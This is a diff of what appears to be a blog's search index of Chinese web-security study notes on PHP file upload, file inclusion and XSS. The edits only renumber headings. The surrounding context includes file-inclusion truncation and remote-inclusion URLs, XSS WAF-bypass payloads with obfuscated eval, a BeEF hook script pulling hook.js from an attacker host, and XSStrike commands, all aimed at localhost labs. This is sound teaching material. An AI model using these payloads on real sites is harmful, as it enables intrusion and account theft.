@@ -1172,11 +1172,7 @@ $upload_dir = &#x27;./uploads/&#x27;;  // 定义文件保存目录$file_name = &
 $_FILES 是PHP专门用来接收用户上传文件的所有信息的超全局变量,没有它就实现不了文件上传功能。
 
 核心语法：$_FILES[&#39;表单名称&#39;][&#39;属性名&#39;]
-核心属性：a. $_FILES[&#39;file&#39;][&#39;name&#39;]：获取用户上传文件的「原始文件名」,比如 头像.jpg、test.php；
-重点：这个值是攻击者可以随意篡改的!攻击者可以把恶意PHP文件改成 头像.jpg.php,伪装成图片,这是文件上传漏洞的核心利用点。b. $_FILES[&#39;file&#39;][&#39;tmp_name&#39;]：获取用户上传文件在服务器的「临时文件名+临时路径」；
-重点：这个值是PHP自动生成的,攻击者完全无法篡改、无法伪造,是PHP的安全机制,用来防止攻击者伪造文件上传。
-
-
+核心属性：a. $_FILES[&#39;file&#39;][&#39;name&#39;]：获取用户上传文件的「原始文件名」,比如 头像.jpg、test.php；  i. 重点：这个值是攻击者可以随意篡改的!攻击者可以把恶意PHP文件改成 头像.jpg.php,伪装成图片,这是文件上传漏洞的核心利用点。b. $_FILES[&#39;file&#39;][&#39;tmp_name&#39;]：获取用户上传文件在服务器的「临时文件名+临时路径」；  i. 重点：这个值是PHP自动生成的,攻击者完全无法篡改、无法伪造,是PHP的安全机制,用来防止攻击者伪造文件上传。
 
 (4) $_GET 超全局变量——接收GET请求传递的参数
 $_GET 专门用来接收用户通过**「GET请求」**传递的所有数据,数据来自于浏览器地址栏的URL中。
@@ -2612,7 +2608,7 @@ txt文件被PHP解析执行。
 原理：%00终止字符串，.html被舍弃。
 访问：http://localhost/include/upload2.php?filename=1.txt%00
 
-②超长路径截断
+2. 超长路径截断
 原理：Windows文件名上限255字符、Linux4096字符，大量.填充耗尽路径，末尾.html被丢弃.
 ?filename=1.txt......................................................................
 
@@ -2688,7 +2684,7 @@ on
 ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,
 
 
-1、http&#x2F;https协议远程包含常规协议。
+1. http&#x2F;https协议远程包含常规协议。
 (高亮的部分是伪协议）
 http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
 
@@ -2748,8 +2744,8 @@ http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
   <entry>
     <title>XSS漏洞</title>
     <url>/2026/06/08/XSS%E6%BC%8F%E6%B4%9E/index/</url>
-    <content><![CDATA[一、XSS简介与危害（1）定义跨站脚本攻击XSS（Cross Site Scripting），为避免与层叠样式表（CSS）缩写混淆，故缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
-（2）危害
+    <content><![CDATA[一、XSS简介与危害1. 定义跨站脚本攻击XSS（Cross Site Scripting），为避免与层叠样式表（CSS）缩写混淆，故缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
+2. 危害
 盗取各类用户账号，如机器登录帐号、用户网银帐号、各类管理员帐号
 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
 盗窃企业重要的具有商业价值的资料
@@ -2761,7 +2757,7 @@ http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
 
 
 二、反射型与存储型XSSXSS攻击可分为三类：反射型、存储型、DOM型，易混淆的是反射和DOM类型。
-1. 反射型（1）反射型流程
+1. 反射型1. 反射型流程
 黑客诱导用户点击恶意URL：xxxxxxx.com/?xxx=&lt;script&gt;恶意代码&lt;/script&gt;
 客户端向URL对应的服务器发出请求
 服务器将恶意代码从URL中取出，拼接在HTML中返回给浏览器
@@ -2830,7 +2826,7 @@ F12，发现可以输入的最大长度是 20，那我们就可以把它的数�
 
 
 只要刷新这个页面，就会重复出现这句话。
-3. DOM型（1）流程
+3. DOM型1. 流程
 黑客诱导用户点击恶意URL
 
 #&#x27; onclick=&quot;alert(1)&quot;
@@ -2859,7 +2855,7 @@ F12，发现可以输入的最大长度是 20，那我们就可以把它的数�
 BeEF是Kali自带的XSS利用工具，基于Ruby开发。
 
 
-（1）核心信息
+1. 核心信息
 Web UI：http://127.0.0.1:3000/ui/panel
 Hook代码：&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;
 
@@ -2883,7 +2879,7 @@ Hook代码：&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/s
 http://localhost/1.php?x=%3Cscript%3Ealert(1)%3C/script%3E
 
 2. 开启WAF（安全狗）请求被拦截，提示“带有不合法参数”。
-3. 手工绕过（1）标签语法替换
+3. 手工绕过1. 标签语法替换
 audio标签
 
 &lt;audio src=x onerror=alert(47)&gt;&lt;audio src=x onerror=prompt(1);&gt;&lt;audio src=1 href=1 onerror=javascript:alert(1)&gt;
@@ -2898,10 +2894,10 @@ button标签
 
 &lt;button onfocus=alert(1) autofocus&gt;&lt;button/onclick=alert(1)&gt;xss&lt;/button&gt;
 
-（2）加密算法&lt;details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;# 97,108,101,114,116,40,49,41 = alert(1)
+2. 加密算法&lt;details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;# 97,108,101,114,116,40,49,41 = alert(1)
 
 4. XSStrike工具可识别并绕过WAF的XSS扫描工具，项目地址：https://github.com/s0md3v/XSStrike
-（1）常用参数XSStrike
+1. 常用参数XSStrike
 -h, --help显示帮助信息
 -u, --url指定目标 URL
 --dataPOST 方式提交内容
@@ -2925,9 +2921,9 @@ button标签
 --headers提供 HTTP 标头
 -d, --delay设置请求延迟
 
-（2）使用示例# 安装依赖pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/# Fuzz测试python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot; --fuzzer# 直接探测python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot;
+2. 使用示例# 安装依赖pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/# Fuzz测试python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot; --fuzzer# 直接探测python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot;
 
-（3）优化测试页面&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;title&gt;欢迎来到&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎&lt;/h1&gt;&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;&lt;center&gt;测试XSS&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
+3. 优化测试页面&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;title&gt;欢迎来到&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎&lt;/h1&gt;&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;&lt;center&gt;测试XSS&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
 
 
 四、总结Q1：XSS 是什么？跨站脚本攻击
